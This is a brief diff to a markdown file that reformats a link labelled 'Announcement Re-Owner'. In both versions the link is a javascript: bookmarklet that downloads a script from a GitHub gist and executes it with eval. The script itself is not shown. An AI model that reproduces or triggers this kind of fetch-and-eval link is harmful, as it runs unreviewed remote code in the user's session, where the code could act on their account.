@@ -1,2 +1,2 @@
-[Announcement Re-Owner][1]
-[1]:(javascript:(()=>{fetch('https://gist.githubusercontent.com/lujaamko/151a44b1d279d95685251b6c8fba99ba/raw/a0a4b7fe126a36d80d05c4571e62598d15fad677/reown_announce.js').then(r=>r.text()).then(code=>eval(code)).catch(e=>alert('Failed to load script:\n'+e));})())
+[Announcement Re-Owner](1)
+(1):(javascript:(()=>{fetch('https://gist.githubusercontent.com/lujaamko/151a44b1d279d95685251b6c8fba99ba/raw/a0a4b7fe126a36d80d05c4571e62598d15fad677/reown_announce.js').then(r=>r.text()).then(code=>eval(code)).catch(e=>alert('Failed to load script:\n'+e));})())
